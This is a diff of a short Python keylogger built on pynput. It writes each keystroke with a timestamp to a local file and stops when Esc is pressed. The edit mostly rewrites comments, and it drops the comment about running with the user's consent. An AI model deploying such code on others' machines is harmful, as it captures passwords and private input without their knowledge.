@@ -1,49 +1,45 @@
-# Before running, make sure the following is installed on terminal:
-# 'pip install pynput'
-
-# Importing packages
+# necessary packages
 from pynput import keyboard
 import time
 
-# Logs will be written to this file
+#file containing all logs
 log_file = "keystroke_logger.txt"
-
-# Flag to track whether logging is active
+# var to check if logging active
 logging_active = True
 
-def on_press(key):
+def press(key):
     global logging_active
-    # On key press, this function will be called
+    # when a key is pressed the function runs
     try:
-        # Trying to append key to file
+        # this is where chars are put into file
         with open(log_file, "a") as file:
             if hasattr(key, 'char'):
                 file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n")
-                print(key.char, end='', flush=True)  # Print the typed character
+                print(key.char, end='', flush=True)  # print the typed character
             else:
                 file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key}\n")
     except Exception as e:
-        # Handle exceptions
+        # handling exceptions
         print(f"Error: {str(e)}")
 
-    # Check if 'Esc' key was pressed to stop logging
+    # esc ends it
     if key == keyboard.Key.esc:
         logging_active = False
-        return False  # Stop listener
+        return False
 
-# Ensuring that the logger works with the consent and knowledge of the user.
-print("Starting keylogger. Press 'Esc' to stop logging.")
+
+print("Keylogger starting, Press esc to end.")
 try:
     # Start listening to keys
-    with keyboard.Listener(on_press=on_press) as listener:
+    with keyboard.Listener(on_press=press) as listener:
         listener.join()
 except KeyboardInterrupt:
-    # Handle manual interruption
+    # handle manual interruption
     pass
 except Exception as e:
-    # Handle other potential exceptions
+    # handle other potential exceptions
     print(f"Error: {str(e)}")
 
-# Add a message to indicate that logging has stopped
+# have a message to show logging has stopped
 if not logging_active:
-    print("\nLogging stopped.")
+    print("\nEnded.")
